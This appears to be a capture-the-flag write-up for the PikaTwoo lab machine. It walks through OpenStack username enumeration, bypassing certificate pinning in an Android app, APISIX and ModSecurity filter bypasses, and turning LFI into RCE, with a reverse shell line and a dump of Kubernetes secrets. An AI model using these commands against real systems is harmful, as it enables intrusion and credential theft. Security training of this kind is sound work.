## Overview

PikaTwoo is an Insane-difficulty Linux machine that throws an entire cloud-native stack at you: OpenStack (Keystone + Swift), a Flutter Android app, ModSecurity, Apache APISIX, and Kubernetes. The path to `user.txt` is long but linear — leak an APK, defeat its certificate pinning, abuse the API behind it, turn a file-inclusion bug into code execution inside a pod, then pivot through Kubernetes secrets and APISIX to recover SSH credentials. This post stops at the user flag.

## Recon

| Port | Service | Notes |
|------|---------|-------|
| 22   | OpenSSH | host login |
| 80/443 | nginx | Pokatdex site, ModSecurity WAF |
| 5000 | OpenStack Keystone | identity service |
| 8080 | OpenStack Swift | object storage |

```bash
nmap -p- --min-rate=1000 -T4 10.129.228.159
nmap -p22,80,443,5000,8080 -sC -sV 10.129.228.159
```

The mix of OpenStack ports (5000 Keystone, 8080 Swift) alongside a normal web app is the tell — the box wants you enumerating cloud services, not just the website.

## Enumeration

Keystone on port 5000 is vulnerable to **CVE-2021-38155**: an invalid login for an *existing* user returns an "account is locked" message, while unknown users don't — a username oracle. A dictionary attack reveals `admin` and `andrew`:

```bash
while read u; do for i in {1..7}; do curl -s --json '{"auth":{"identity":{"methods":["password"],"password":{"user":{"name":"'$u'","domain":{"id":"default"},"password":"x"}}}}}' http://10.129.228.159:5000/v3/auth/tokens | grep -q "account is locked" && { echo "$u"; break; }; done; done < /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

Swift uses Keystone for auth, so the account's base URL is `/v1/AUTH_andrew/`. Its ACLs are misconfigured, allowing unauthenticated listing — an `android` container holds an APK:

```bash
gobuster dir -u http://10.129.228.159:8080/v1/AUTH_andrew/ -w /usr/share/dirb/wordlists/common.txt -b 404,401
wget http://10.129.228.159:8080/v1/AUTH_andrew/android/pokatmon-app.apk
```

## Foothold

The APK is a Flutter app with certificate pinning, so MITM fails until we patch it. Open `lib/x86_64/libflutter.so` in Ghidra and force the certificate-check function to always succeed (`XOR EBX,EBX`→`INC EBX`, and `JZ`→`JMP`), then rebuild and sign:

```bash
apktool d pokatmon-app.apk
# patch lib/x86_64/libflutter.so in Ghidra, then:
apktool b pokatmon-app
jarsigner -keystore k.jks pokatmon-app/dist/pokatmon-app.apk a
zipalign -v 4 pokatmon-app/dist/pokatmon-app.apk patched.apk
```

Intercepting now reveals the app signs API requests with an RSA key — which ships in the APK assets (`assets/flutter_assets/keys/private.pem`). We can forge and sign arbitrary payloads, and the `/public/validate` endpoint is SQL-injectable, leaking an email and beta code.

APISIX (2.10.1) blocks paths containing `private`, but **CVE-2021-43557** matches the raw URI — URL-encoding the last character (`privat%65`) slips past the filter while the backend still routes it to `/private/`. That exposes a password-reset endpoint we use to take over the account:

```bash
curl -k --path-as-is https://api.pokatmon-app.htb/privat%65/password-reset
curl -X POST -d "new_password=<redacted>" -d "token=<token>" -k --path-as-is "https://api.pokatmon-app.htb/privat%65/password-reset/<email>"
```

Logging in reveals an API vhost `pokatdex-api-v1.pokatmon-app.htb` that includes region data from files. The traversal is blocked by ModSecurity — but a CRS Drupal-exclusion rule disables body inspection for POSTs to `/admin/content/assets/add/[a-z]+` when a `SESS` cookie is set. Appending that path to the request bypasses the WAF:

```bash
curl -b "SESS0=a" -d "region=../../../../../../etc/passwd" "http://pokatdex-api-v1.pokatmon-app.htb//admin/content/assets/add/a"
```

The LFI becomes RCE via Nginx's client-body temp files — race `/proc` to include the buffered `<?php ... ?>` body:

```bash
python3 lfi_rce.py http://pokatdex-api-v1.pokatmon-app.htb '/bin/bash -c "bash -i &>/dev/tcp/<lhost>/7777 0>&1"'
```

This lands a shell inside a Kubernetes pod. The pod's service-account token can read its namespace secrets, leaking an APISIX admin key, and APISIX's `batch-requests` plugin (**CVE-2022-24112**) lets us bypass its admin-IP restriction to create a route that executes a reverse shell — a shell on the APISIX pod. Its config file then hands over reusable SSH credentials:

```bash
SA=/var/run/secrets/kubernetes.io/serviceaccount
curl -s --cacert $SA/ca.crt -H "Authorization: Bearer $(cat $SA/token)" https://kubernetes.default.svc/api/v1/namespaces/applications/secrets
cat /usr/local/apisix/conf/config.yaml          # eureka host -> andrew:<redacted>
sshpass -p '<redacted>' ssh andrew@10.129.228.159
```
